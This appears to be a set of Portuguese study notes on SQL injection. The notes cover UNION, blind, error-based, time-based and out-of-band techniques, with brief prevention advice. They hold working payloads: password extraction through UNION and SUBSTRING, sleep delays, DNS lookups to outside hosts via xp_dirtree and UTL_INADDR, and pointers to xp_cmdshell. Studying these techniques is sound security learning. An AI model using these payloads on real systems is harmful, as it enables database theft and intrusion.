# SQLi
owasp, https://sqlwiki.netspi.com/

## passo-a-passo

- 1) descobrir sqli (concatenando, somando, ...)
- 2) descobrir qual o db sendo executado (mysql, oracle)
- 3) dumpar a base/executar comandos no SO

## ataques UNION
- union serve para juntar informações de 2 querys
- pode ser usado no SELECT 
- as querys devem retornar o mesmo número de colunas e elas devem ser compatíveis
- para descobrir o número de colunas pode-se usar brute-force
    * injetar ORDER BY e incrementar o index da coluna
    * fazer UNION com SELECT NULL e aumentar a quantidade de NULLs
- para descobrir o tipo de uma coluna:
    * ir tentando unir cada coluna com string: UNION SELECT 'a', NULL--
- pode-se usar || para concatenar colunas
    * ' UNION SELECT user || ' ' || password from USERS--


## especificações

- dependendo no db pode-se criar arquivos ou executar comandos direto na shell do SO (mssql - xp_cmdshell, mysql - into outfile)

### nomes de tabelas e colunas
- em nao oracle: 
    - SELECT table_name FROM information_schema.tables 
    - SELECT column_name FROM information_schema.columns 
- em oracle:
    - SELECT table_name FROM all_tables
    - SELECT column_name FROM all_tab_columns 

### oracle

- db SELECT precisa de FROM então usar: SELECT NULL FROM DUAL 
- versão do banco: SELECT * FROM v$version 

### mysql
comentários com -- devem ser seguidos de espaço ou pode ser usado #

## blind sql
- não retorna o resultado da query na response
- tentar causar erro na query sql para ver se a response tem alguma variação de comportamento
* pode-se tentar uma query de sleep para verificar a ocorrência
* ou também uma interação out-of-band

### responses condicionais
- response muda comportamento com o injection, permitindo validar condições (e assim obter informações por tentativa)
- 123' AND 1=0
- 123' AND 1=0 UNION select 'a' FROM users WHERE username = 'admin' and SUBSTRING(password, 3, 1) > 'm'-- 

### induzindo responses condicionais com errors SQL 
- induzir erros não tratados na aplicação para alterar comportamento da response e assim conseguir validar condições
- sql faz pre-verificação de tipos antes de executar, logo case deve respeitar tipo:
- 123' UNION SELECT CASE WHEN (1=1) THEN (cast(1/0 as char(2))) ELSE NULL END-- 

### induzindo responses condicionais com time delays
- caso a aplicação trate muito bem qualquer erro interno gerado, sem mudanças de comportamento, outra forma de detectar um sqli é com uma condição de sleep 
- comandos de delay específicos para cada db
- 123' union select case when (1=1) then (cast((SELECT pg_sleep(10)) as char(2))) else null end --

### usando tecnicas out-of-band (oast)
- caso a response da aplicação não dependa da query sql (ela é feita asincronamente) é necessário uma solução que envolva outro canal de comunicação (geralmente é usado o dns por ser mais liberado em qualquer ambiente)
- específico para cada db
- SELECT UTL_INADDR.get_host_address('burpcollaborator.net') from dual


## detectando

- submeter: 
* ' 
* ' OR 1=1--
* '; waitfor delay('0:0:20')--
* out-of-band: exec master..xp_dirtree '//duck.com/a'

## second-order 

- stored sqli
- payload é armazenado internamente para ser execução posteriormente

## prevenindo

- não colocar input diretamente na query

- tratar (parametrizar) entrada do usuário antes (lib)


